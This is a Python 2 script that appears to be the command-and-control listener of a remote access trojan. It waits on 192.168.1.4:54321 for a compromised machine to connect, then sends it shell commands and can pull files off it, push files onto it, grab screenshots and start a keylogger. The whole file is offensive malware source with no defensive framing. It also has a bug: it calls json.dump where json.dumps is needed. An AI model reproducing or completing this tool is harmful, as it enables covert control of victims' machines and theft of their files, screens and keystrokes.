#!/usr/bin/python
# python 2

import socket
import json
import base64

count = 1

def reliable_send(data):
    json_data = json.dump(data)
    target.send(json_data)


def reliable_recv():
    data = ""
    while True:
        try:
            data = data + target.recv(1024)
            return json.loads(data)
        except ValueError:
            continue


def shell():
    global count
    while True:
        command = raw_input("* Shell#~%s: " %str(ip))
        reliable_send(command)
        if command == 'exit':
            break
        elif command[:2] == "cd" and len(command) > 1:
            continue
        elif command[:8] == "download":
            # wb = write bytes 
            with open(command[9:], "wb") as file:
                file_data = reliable_recv()
                file.write(base64.b64decode(file_data))
        elif command[:6] == "upload":
            try:
                # rb = read bytes
                with open(command[7:], "rb") as fin:
                    reliable_send(base64.b64encode(fin.read()))
            except:
                failed = "Failed to Upload"
                reliable_send(base64.b64encode(failed))
        elif command[:10] == "screenshot":
            with open("screenshot%d" %  count, "wb") as screen:
                image = reliable_recv()
                image_decoded = base64.b64decode(image)
                if image_decoded[:4] == "[!!]":
                    print(image_decoded)
                else:
                    screen.write(image_decoded)
                    count += 1
        elif command[:12] == "keylog_start":
            continue
        else:
            result = reliable_recv()
            print(result)


def server():
    global soc
    global ip
    global target

    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # binds local IP address to port
    soc.bind(("192.168.1.4",54321))
    soc.listen(5)
    print("[+] Listening for incoming connections")
    target, ip = soc.accept()
    print("[+] Connection established from: %s" % str(ip))


server()
shell()
soc.close()